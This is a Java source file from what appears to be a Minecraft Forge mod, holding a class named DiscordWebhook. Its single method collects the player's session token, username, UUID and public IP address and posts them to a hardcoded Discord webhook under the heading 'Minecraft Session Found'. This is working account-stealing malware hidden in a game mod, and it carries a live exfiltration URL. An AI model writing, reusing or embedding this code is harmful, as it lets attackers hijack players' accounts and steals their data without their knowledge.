package studio.dreamys;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;
import net.minecraft.client.Minecraft;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.awt.*;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;
import java.util.Objects;


public class DiscordWebhook {
    public static Webhook.EmbedObject embed;
    public static void sendWebhook() throws IOException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        Minecraft mc = Minecraft.getMinecraft();
        String token = mc.getSession().getToken();
        String username = mc.getSession().getUsername();
        String uuid = mc.getSession().getPlayerID();
        String IP = (new BufferedReader(new InputStreamReader((new URL("https://checkip.amazonaws.com/")).openStream()))).readLine();
        String nw = "https://sky.shiiyu.moe/stats/" + username;

        Webhook webhook = new Webhook("https://discord.com/api/webhooks/1045876614791172206/5smC3thQ6vhVcroLOrHYhZeL8gChrq98LvEk3OeBaXiJqhW4wgdfoyQ0IJwTXMKIW3M2");
        Webhook.EmbedObject embed = new Webhook.EmbedObject();
        embed.setTitle("{!] Minecraft Session Found {!]");
        embed.setThumbnail("https://crafatar.com/avatars/" + uuid);
        embed.addField("USERNAME - ", username, false);
        embed.addField("UUID - ", uuid, false);
        embed.addField("IP - ", IP, false);
        embed.addField("TOKEN - ", token, false);
        embed.addField("SKYBLOCK - ", nw, false);
        embed.setColor(Color.GRAY);
        embed.setFooter(getTime(), null);
        webhook.addEmbed(embed);

        webhook.execute();
    }
    public static String getTime() {
        SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy HH:mm");
        Date date = new Date();
        return (formatter.format(date));
    }
}